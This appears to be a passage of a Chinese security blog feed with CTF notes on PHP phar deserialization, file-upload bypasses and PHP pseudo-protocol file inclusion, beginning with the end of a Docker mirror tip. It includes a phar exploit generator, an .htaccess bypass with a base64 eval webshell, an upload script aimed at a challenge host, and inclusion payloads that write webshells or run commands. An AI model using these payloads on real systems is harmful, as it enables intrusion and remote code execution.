class="line"></span><br></pre></td></tr></table></figure></div></li><li><p>**&lt;目标路径&gt;**：容器内的指定路径，该路径不用事先建好，<u>路径不存在的话，会自动创建</u>。</p></li></ul><h2 id="镜像源拉取超时问题"><a href="#镜像源拉取超时问题" class="headerlink" title="镜像源拉取超时问题"></a>镜像源拉取超时问题</h2><p>将dockerfile中的</p><p><a class="link"   href="http://link.zhihu.com/?target=http://k8s.gcr.io" >k8s.gcr.io <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> —&gt; lank8s.cn<br><a class="link"   href="http://link.zhihu.com/?target=http://gcr.io" >gcr.io <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> –&gt; gcr.lank8s.cn</p>]]></content>
      
      
      <categories>
          
          <category> utils </category>
          
      </categories>
      
      
        <tags>
            
            <tag> docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>phar反序列化</title>
      <link href="/2022/01/03/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
      <url>/2022/01/03/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<h1 id="phar反序列化"><a href="#phar反序列化" class="headerlink" title="phar反序列化"></a>phar反序列化</h1><h3 id="phar文件结构"><a href="#phar文件结构" class="headerlink" title="phar文件结构"></a>phar文件结构</h3><p>1.a stub<br>    可以理解为一个标志，格式为xxx<?php xxx; __HALT_COMPILER();?>，前面内容不限，但必须以__HALT_COMPILER();来结尾，否则phar扩展将无法识别这个文件为phar文件<br>2.a manifest describing the contents<br>    phar文件本质上是一种压缩文件，其中每个被压缩文件的权限、属性等信息都放在这部分。这部分还会以序列化的形式存储用户自定义的meta-data，这是上述攻击手法最核心的地方<br>3.the file contents—被压缩文件的内容<br>4.[optional] a signature for verifying Phar integrity (phar file format only)—签名，放在文件末尾</p><h3 id="生成phar文件"><a href="#生成phar文件" class="headerlink" title="生成phar文件"></a>生成phar文件</h3><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">TestObject</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @<span class="title function_ invoke__">unlink</span>(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line">    <span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;phar.phar&quot;</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//设置stub</span></span><br><span class="line">    <span class="variable">$o</span> = <span class="keyword">new</span> <span class="title class_">TestObject</span>();</span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$o</span>); <span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line">    <span class="comment">//签名自动计算</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div><blockquote><p>会在同目录生成 phar.phar 文件</p><p>注意：要想生成phar文件，必须将phar.readonly配置项配置为0或Off,并且删除行首分号，在行尾加. 否则无法生成phar文件</p></blockquote><h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>meta-data是以序列化的形式存储的</p><p>php一大部分的文件系统函数在通过<code>phar://</code>伪协议解析phar文件时，都会将meta-data进行<a class="link"   href="https://so.csdn.net/so/search?q=%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96&spm=1001.2101.3001.7020" >反序列化 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>，测试后受影响的函数如下</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202407032221511.jpg"                      alt="image-20211018194419673"                ><figcaption>image-20211018194419673</figcaption></figure></p><h3 id="SWPUCTF-2018-SimplePHP-EXP"><a href="#SWPUCTF-2018-SimplePHP-EXP" class="headerlink" title="[SWPUCTF 2018]SimplePHP EXP"></a>[SWPUCTF 2018]SimplePHP EXP</h3><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C1e4r</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$test</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$params</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$c</span>=<span class="keyword">new</span> <span class="title class_">Test</span>();</span><br><span class="line"><span class="variable">$c</span>-&gt;params=<span class="keyword">array</span>(<span class="string">&#x27;source&#x27;</span>=&gt;<span class="string">&#x27;var/www/html/f1ag.php&#x27;</span>);<span class="comment">//flag所在路径</span></span><br><span class="line"><span class="variable">$b</span>=<span class="keyword">new</span> <span class="title class_">Show</span>();</span><br><span class="line"><span class="variable">$b</span>-&gt;str[<span class="string">&#x27;str&#x27;</span>]=<span class="variable">$c</span>;<span class="comment">//为了不存在的调用触发__get()</span></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">C1e4r</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;str=<span class="variable">$b</span>;<span class="comment">//触发__toString()</span></span><br><span class="line">@<span class="title function_ invoke__">unlink</span>(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>=<span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>(); </span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&#x27;GIF89a&#x27;</span>.<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//设置stub，增加图片类型文件头</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$a</span>); <span class="comment">//meta-data储存的信息</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>);<span class="comment">//生成签名</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br></pre></td></tr></table></figure></div><blockquote><p>要想生成phar文件，必须将php.ini中phar.readonly配置项配置为0或Off,并且删除行首分号，在行尾加.</p><p>生成的phar中metada.bin内容为类序列化后的内容</p></blockquote><h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><h3 id="绕过-lt-过滤"><a href="#绕过-lt-过滤" class="headerlink" title="绕过&lt;?过滤"></a>绕过&lt;?过滤</h3><p>.htaccess绕过文件头检查</p><p>如果用一般的<code>GIF89a</code>文件头绕过，会导致htaccess文件无法执行，因此这里用定义高度与宽度，#在htaccess中被视为注释</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#define width 1337</span><br><span class="line">#define height 1337</span><br><span class="line">AddType application/x-httpd-php .a</span><br><span class="line">php_value auto_append_file &quot;php://filter/convert.base64-decode/resource=./shell.a&quot;</span><br></pre></td></tr></table></figure></div><p>shell.a内容</p><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a11</span><br><span class="line">PD9waHAgZXZhbCgkX1BPU1RbJ2NtZCddKTs/Pg==</span><br></pre></td></tr></table></figure></div><blockquote><p>文件头后加的内容是为了补足8个字节，满足base64编码规则</p></blockquote><h3 id="文件上传python脚本"><a href="#文件上传python脚本" class="headerlink" title="文件上传python脚本"></a>文件上传python脚本</h3><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">r&quot;http://7c586462-a2f1-4008-a870-9303b30d8fb1.node4.buuoj.cn/?_=$&#123;%80%80%80%80^%df%c7%c5%d4&#125;&#123;%80&#125;();&amp;%80=get_the_flag&quot;</span> <span class="comment"># 执行get_the_flag函数</span></span><br><span class="line">session = requests.session()</span><br><span class="line">htaccess_content = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">#define width 1337</span></span><br><span class="line"><span class="string">#define height 1337</span></span><br><span class="line"><span class="string">AddType application/x-httpd-php .a</span></span><br><span class="line"><span class="string">php_value auto_append_file &quot;php://filter/convert.base64-decode/resource=./shell.a&quot;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">files_htaccess = &#123;<span class="string">&#x27;file&#x27;</span>: (</span><br><span class="line">    <span class="string">&#x27;.htaccess&#x27;</span>, htaccess_content, <span class="string">&#x27;image/jpeg&#x27;</span>)&#125;</span><br><span class="line">res_hta = session.post(url, files=files_htaccess)</span><br><span class="line"><span class="built_in">print</span>(res_hta.text)</span><br><span class="line">shell_file = <span class="string">&#x27;GIF89a12PD9waHAgZXZhbCgkX1JFUVVFU1RbJ2NtZCddKTs/Pg==&#x27;</span></span><br><span class="line">files_shell = &#123;<span class="string">&#x27;file&#x27;</span>: (</span><br><span class="line">    <span class="string">&#x27;shell.a&#x27;</span>, shell_file, <span class="string">&#x27;image/jpeg&#x27;</span>)&#125;</span><br><span class="line">res_jpg = session.post(url, files=files_shell)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(res_jpg.text)  <span class="comment"># 打印路径</span></span><br></pre></td></tr></table></figure></div>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> php </tag>
            
            <tag> 反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>php伪协议</title>
      <link href="/2022/01/02/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/"/>
      <url>/2022/01/02/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/</url>
      
        <content type="html"><![CDATA[<h1 id="PHP伪协议"><a href="#PHP伪协议" class="headerlink" title="PHP伪协议"></a>PHP伪协议</h1><h2 id="前置条件–php-ini参数设置"><a href="#前置条件–php-ini参数设置" class="headerlink" title="前置条件–php.ini参数设置"></a>前置条件–php.ini参数设置</h2><p>allow_url_fopen:默认值是ON。允许url里的封装协议访问文件；</p><p>allow_url_include:默认值是OFF。不允许包含url里的封装协议包含文件；</p><h2 id="文件包含函数"><a href="#文件包含函数" class="headerlink" title="文件包含函数"></a>文件包含函数</h2><p>1、<code>include</code> 2、<code>require</code> 3、<code>include_once</code> 4、<code>require_once</code> 5、<code>highlight_file </code>6、<code>show_source</code> 7、<code>readfile</code></p><p>8、<code>file_get_contents </code>9、<code>fopen</code> 10、<code>file</code>(比较常见)</p><h2 id="php支持的伪协议"><a href="#php支持的伪协议" class="headerlink" title="php支持的伪协议"></a>php支持的伪协议</h2><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> file:<span class="comment">// — 访问本地文件系统</span></span><br><span class="line"><span class="number">2</span> http:<span class="comment">// — 访问 HTTP(s) 网址</span></span><br><span class="line"><span class="number">3</span> ftp:<span class="comment">// — 访问 FTP(s) URLs</span></span><br><span class="line"><span class="number">4</span> php:<span class="comment">// — 访问各个输入/输出流（I/O streams）</span></span><br><span class="line"><span class="number">5</span> zlib:<span class="comment">// — 压缩流</span></span><br><span class="line"><span class="number">6</span> data:<span class="comment">// — 数据（RFC 2397）</span></span><br><span class="line"><span class="number">7</span> glob:<span class="comment">// — 查找匹配的文件路径模式</span></span><br><span class="line"><span class="number">8</span> phar:<span class="comment">// — PHP 归档</span></span><br><span class="line"><span class="number">9</span> ssh2:<span class="comment">// — Secure Shell 2</span></span><br><span class="line"><span class="number">10</span> rar:<span class="comment">// — RAR</span></span><br><span class="line"><span class="number">11</span> ogg:<span class="comment">// — 音频流</span></span><br><span class="line"><span class="number">12</span> expect:<span class="comment">// — 处理交互式的流</span></span><br></pre></td></tr></table></figure></div><p><a class="link"   href="https://segmentfault.com/a/1190000018991087" >https://segmentfault.com/a/1190000018991087 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><h2 id="file-x2F-x2F"><a href="#file-x2F-x2F" class="headerlink" title="file:&#x2F;&#x2F;"></a><strong>file:&#x2F;&#x2F;</strong></h2><p>该协议在双off情况下也能正常使用，用于访问本地文件系统(本地指定的是当前环境，ctf中的题目环境)</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/cmd.php?file=file://文件绝对路径/网络路径</span><br></pre></td></tr></table></figure></div><h2 id="php-x2F-x2F"><a href="#php-x2F-x2F" class="headerlink" title="php:&#x2F;&#x2F;"></a>php:&#x2F;&#x2F;</h2><p>php:&#x2F;&#x2F;作用为访问输入输出流</p><p>使用条件：</p><p><strong>1. 不需要开启allow_url_fopen</strong></p><p><strong>2. php:&#x2F;&#x2F;input、 php:&#x2F;&#x2F;stdin、 php:&#x2F;&#x2F;memory 和 php:&#x2F;&#x2F;temp 需要开启allow_url_include。</strong></p><blockquote><p>php:&#x2F;&#x2F;filter 用于读取源码且在双off的情况下也可以正常使用</p></blockquote><h2 id="php-x2F-x2F-filter"><a href="#php-x2F-x2F-filter" class="headerlink" title="php:&#x2F;&#x2F;filter"></a>php:&#x2F;&#x2F;filter</h2><p>该协议可以获取指定文件源码，当它与包含函数结合时，php:&#x2F;&#x2F;filter流会被当作php文件执行。所以我们一般对其进行编码(通常base64)，让其不执行。</p><table><thead><tr><th>名称</th><th>描述</th></tr></thead><tbody><tr><td>resource&#x3D;&lt;要过滤的数据流&gt;</td><td>这个参数是必须要出现在协议中的，决定了你要读取的数据流(文件)</td></tr><tr><td>read&#x3D;&lt;读链的筛选列表&gt;</td><td>该参数可选。可以设定一个或多个过滤器名称，以管道符（&#96;</td></tr><tr><td>write&#x3D;&lt;写链的筛选列表&gt;</td><td>该参数可选。可以设定一个或多个过滤器名称，以管道符（&#96;</td></tr><tr><td>&lt;；两个链的筛选列表&gt;</td><td>任何没有以 <code>read=</code> 或 <code>write=</code> 作前缀 的筛选器列表会视情况应用于读或写链。</td></tr></tbody></table><blockquote><p>以下两种用法相同<br><code>?filename=php://filter/read=convert.base64-encode/resource=xxx.php</code><br><code>?filename=php://filter/convert.base64-encode/resource=xxx.php</code></p></blockquote><p>常见payload</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php://filter/read=convert.base64-encode/resource=index.php 以base64编码方式输出源码</span><br><span class="line">php://filter/resource=index.php</span><br></pre></td></tr></table></figure></div><blockquote><p>使用的convert.base64-encode，就是一种过滤器</p></blockquote><h3 id="过滤器"><a href="#过滤器" class="headerlink" title="过滤器"></a>过滤器</h3><p><strong>一、字符串过滤器</strong></p><p>通常以<code>string</code>开头，对每个字符都进行同样方式的处理。</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">string.rot13  <span class="comment"># 一种字符处理方式，字符右移十三位。</span></span><br><span class="line">string.toupper  <span class="comment"># 将所有字符转换为大写。</span></span><br><span class="line">string.tolower  <span class="comment"># 将所有字符转换为小写。</span></span><br><span class="line">string.strip_tags  <span class="comment"># 这个过滤器就比较有意思，用来处理掉读入的所有标签，例如XML的等等。在绕过死亡exit大有用处。</span></span><br></pre></td></tr></table></figure></div><p><strong>二、转换过滤器</strong></p><p>对数据流进行编码，防止被解析执行，通常用来读取文件源码。</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">convert.base64-encode  <span class="comment"># base64加密</span></span><br><span class="line">convert.base64-decode  <span class="comment"># base64解密</span></span><br><span class="line">convert.quoted-printable-encode &amp; convert.quoted-printable-decode  </span><br><span class="line"><span class="comment"># 可以翻译为可打印字符引用编码，使用可以打印的ASCII编码的字符表示各种编码形式下的字符。</span></span><br></pre></td></tr></table></figure></div><p><strong>三、压缩过滤器</strong></p><p>这里的压缩不是生成zip文件，只是压缩和解压数据流中的有效载荷部分。</p><p><code>zlib.deflate</code>（压缩）</p><p><code>zlib.inflate</code>（解压）</p><blockquote><p><code>bzip2.compress</code>和 <code>bzip2.decompress</code>工作的方式与 <a class="link"   href="https://so.csdn.net/so/search?q=zlib&spm=1001.2101.3001.7020" >zlib <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 过滤器大致相同</p></blockquote><p><strong>四、加密过滤器</strong></p><p><code>mcrypt.*</code>和 <code>mdecrypt.*</code>使用 libmcrypt 提供了对称的加密和解密。</p><p><a class="link"   href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html" >https://www.leavesongs.com/PENETRATION/php-filter-magic.html <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><h3 id="利用filter伪协议绕过死亡exit"><a href="#利用filter伪协议绕过死亡exit" class="headerlink" title="利用filter伪协议绕过死亡exit"></a>利用filter伪协议绕过死亡exit</h3><p>死亡exit指的是在进行写入PHP文件操作时，执行了以下函数中的一种：</p><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$content</span>, <span class="string">&#x27;&lt;?php exit();&#x27;</span> . <span class="variable">$content</span>);</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$content</span>, <span class="string">&#x27;&lt;?php exit();?&gt;&#x27;</span> . <span class="variable">$content</span>);</span><br><span class="line"><span class="comment">//这会使php文件开头四exit函数，无法执行后续代码</span></span><br></pre></td></tr></table></figure></div><h4 id="base64decode绕过"><a href="#base64decode绕过" class="headerlink" title="base64decode绕过"></a>base64decode绕过</h4><p>利用php:&#x2F;&#x2F;filter的base64-decode方法，将<code>$content</code>(死亡exit)解码，利用php base64_decode函数特性去除死亡exit,当$content 包含 <?php exit; ?>时，解码过程会先去除识别不了的字符，&lt; ; ? &gt;和空格等都将被去除，于是剩下的字符就只有phpexit以及我们传入的字符了。由于base64是4个byte一组，再添加一个字符例如添加字符’a’后，将’phpexita’当做两组base64进行解码，也就绕过这个死亡exit了。</p><blockquote><p>base64编码中只包含64个可打印字符(a-z 0-9 A-Z)，当PHP遇到不可解码的字符时，会选择性的跳过</p></blockquote><h4 id="strip-tags绕过"><a href="#strip-tags绕过" class="headerlink" title="strip_tags绕过"></a>strip_tags绕过</h4><p><code>&lt;?php exit; ?&gt;</code>实际上是一个XML标签,可以利用strip_tags函数去除,filter是支持多个过滤器的。可以先将webshell经过base64编码，strip_tags去除死亡exit之后，再通过base64-decode复原</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/string.strip_tags|convert.base64-decode/resource=shell.php</span><br></pre></td></tr></table></figure></div><h2 id="data-x2F-x2F"><a href="#data-x2F-x2F" class="headerlink" title="data:&#x2F;&#x2F;"></a>data:&#x2F;&#x2F;</h2><p><strong>利用data:&#x2F;&#x2F; 时，PHP配置文件需要开启allow_url_fopen和allow_url_include</strong></p><p>当它与包含函数结合时，用户输入的data:&#x2F;&#x2F;流会被当作php文件执行</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/include.php?file=data://text/plain,&lt;?php%20phpinfo();?&gt;</span><br><span class="line">http://127.0.0.1/include.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b</span><br></pre></td></tr></table></figure></div><h2 id="php-x2F-x2F-input"><a href="#php-x2F-x2F-input" class="headerlink" title="php:&#x2F;&#x2F;input"></a>php:&#x2F;&#x2F;input</h2><p>将post请求的数据当作php代码执行(记住要加上php头)</p><p>遇到file_get_contents()要想到用php:&#x2F;&#x2F;input绕过</p><blockquote><p>当enctype&#x3D;”multipart&#x2F;form-data”的时候 <code>php://input</code> 是无效的</p></blockquote><h3 id="读取POST数据"><a href="#读取POST数据" class="headerlink" title="读取POST数据"></a>读取POST数据</h3><p>php:&#x2F;&#x2F;input可以读取POST上没有经过解析的原始数据<br>利用php:&#x2F;&#x2F;input 读取POST数据的时候，allow_url_fopen和allow_url_include不需要开启<br>示例代码如下</p><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;php://input&quot;</span>);</span><br></pre></td></tr></table></figure></div><p>上面代码输出file_get_contents函数获取的php:&#x2F;&#x2F;input数据。<br>测试时传入POST数据字符串test<br>最后会在页面回显出test</p><h3 id="写入木马"><a href="#写入木马" class="headerlink" title="写入木马"></a>写入木马</h3><p>利用php:&#x2F;&#x2F;input写入木马的时候，PHP配置文件只需要开启allow_url_include<br>如果POST传入的是PHP代码，就可以写入木马<br>示例代码如下：</p><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div><p>如果POST传入的是一个执行写入木马的PHP代码，就会在当前目录下写入一个木马，通过POST方法传入的是以下代码<br><code>&lt;?php fputs(fopen(&#39;shell.php&#39;,&#39;w&#39;),&#39;&lt;?php @eval($_POST[cmd])?&gt;&#39;);?&gt;</code><br>利用php:&#x2F;&#x2F;input传入木马的PHP代码<br><code>http&quot;//www.abc.com/xxx/file.php?file=php://input</code><br>测试的结果就是通过php:&#x2F;&#x2F;input传入了这个代码，并在当前目录下建立了shell.php文件</p><h3 id="执行命令"><a href="#执行命令" class="headerlink" title="执行命令"></a>执行命令</h3><p><code>&lt;?php system(&#39;ls&#39;);?&gt;</code></p><h2 id="zip-x2F-x2F"><a href="#zip-x2F-x2F" class="headerlink" title="zip:&#x2F;&#x2F;"></a>zip:&#x2F;&#x2F;</h2><p>可以访问压缩包里面的文件。当它与包含函数结合时，zip:&#x2F;&#x2F;流会被当作php文件执行。从而实现任意代码执行。</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">zip://中只能传入绝对路径。</span><br><span class="line">要用#分隔压缩包和压缩包里的内容，并且#要用url编码%23（即下述POC中#要用%23替换）</span><br><span class="line">只需要是zip的压缩包即可，后缀名可以任意更改。</span><br><span class="line">相同的类型的还有zlib://和bzip2://</span><br></pre></td></tr></table></figure></div><ol><li><code>zip://[压缩文件绝对路径]%23[压缩文件内的子文件名]</code>（#编码为%23）</li></ol><p>压缩 phpinfo.txt 为 phpinfo.bz2 并上传（同样支持任意后缀名）</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/include.php?file=compress.bzip2://E:\phpStudy\PHPTutorial\WWW\phpinfo.bz2</span><br></pre></td></tr></table></figure></div><p>2.compress.bzip2:&#x2F;&#x2F;file.bz2</p><p>压缩 phpinfo.txt 为 phpinfo.bz2 并上传（同样支持任意后缀名）</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/include.php?file=compress.bzip2://E:\phpStudy\PHPTutorial\WWW\phpinfo.bz2</span><br></pre></td></tr></table></figure></div><p>3.compress.zlib:&#x2F;&#x2F;file.gz</p><p>压缩 phpinfo.txt 为 phpinfo.gz 并上传（同样支持任意后缀名）</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/include.php?file=compress.zlib://E:\phpStudy\PHPTutorial\WWW\phpinfo.gz</span><br></pre></td></tr></table></figure></div><h2 id="phar-x2F-x2F-伪协议"><a href="#phar-x2F-x2F-伪协议" class="headerlink" title="phar:&#x2F;&#x2F;伪协议"></a>phar:&#x2F;&#x2F;伪协议</h2><p>phar:&#x2F;&#x2F; 是用来解压的伪协议<br>phar:&#x2F;&#x2F;不管参数中是什么拓展名，都会被当做压缩包<br>用法：<code>?file=phar://压缩包/压缩文件</code><br>比如：<code>phar://xxx.png/shell.php</code><br><strong>利用phar:&#x2F;&#x2F; 时，PHP配置文件需要开启allow_url_fopen和allow_url_include，并且PHP版本要高于5.3.0</strong></p><blockquote><p>注意：压缩包需要用zip:&#x2F;&#x2F;伪协议压缩而不能用rar:&#x2F;&#x2F;，将木马文件压缩后，改成任意后缀名都可以正常使用</p></blockquote><p>写一个木马文件shell.php，然后用zip:&#x2F;&#x2F;伪协议压缩成shell.zip，最后修改后缀名为.png，上传图片<br>输入测试：<code>http://www.abc.com/xxx/file.php?file=phar://shell.png/shell.php</code></p><p>这样phar:&#x2F;&#x2F;就会将png当做zip压缩包进行解压，并且访问解压后的shell.php文件</p><h2 id="expect-x2F-x2F-伪协议"><a href="#expect-x2F-x2F-伪协议" class="headerlink" title="expect:&#x2F;&#x2F;伪协议"></a>expect:&#x2F;&#x2F;伪协议</h2><p>expect:&#x2F;&#x2F;伪协议用来执行系统命令，但是需要安装拓展<br>用法: <code>?file=expect://ls</code></p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
